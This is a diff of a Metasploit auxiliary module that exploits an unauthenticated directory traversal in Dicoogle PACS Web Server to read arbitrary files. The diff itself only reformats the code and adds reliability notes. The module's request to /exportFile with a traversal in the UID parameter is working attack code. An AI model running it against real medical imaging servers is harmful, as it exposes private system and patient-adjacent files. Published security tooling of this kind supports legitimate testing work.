@@ -9,35 +9,41 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'        => 'Dicoogle PACS Web Server Directory Traversal',
-      'Description' => %q{
-        This module exploits an unauthenticated directory traversal vulnerability
-        in the Dicoogle PACS Web Server v2.5.0 and possibly earlier, allowing an
-        attacker to read arbitrary files with the web server privileges.
-        While the application is java based, the directory traversal was only
-        successful against Windows targets.
-      },
-      'References'  =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'Dicoogle PACS Web Server Directory Traversal',
+        'Description' => %q{
+          This module exploits an unauthenticated directory traversal vulnerability
+          in the Dicoogle PACS Web Server v2.5.0 and possibly earlier, allowing an
+          attacker to read arbitrary files with the web server privileges.
+          While the application is java based, the directory traversal was only
+          successful against Windows targets.
+        },
+        'References' => [
           ['EDB', '45007']
         ],
-      'Author'      =>
-        [
+        'Author' => [
           'Carlos Avila', # Vulnerability discovery
           'h00die' # Metasploit module
         ],
-      'DisclosureDate' => '2018-07-11',
-      'License'     => MSF_LICENSE
-    ))
+        'DisclosureDate' => '2018-07-11',
+        'License' => MSF_LICENSE,
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
         Opt::RPORT(8080),
         OptString.new('FILEPATH', [true, "The path to the file to read", '/windows/win.ini']),
         OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 15 ])
-      ])
-
+      ]
+    )
   end
 
   def run_host(ip)
@@ -46,7 +52,7 @@ class MetasploitModule < Msf::Auxiliary
 
     res = send_request_cgi({
       'method' => 'GET',
-      'uri'    => '/exportFile',
+      'uri' => '/exportFile',
       'vars_get' => {
         'UID' => traversal
       }
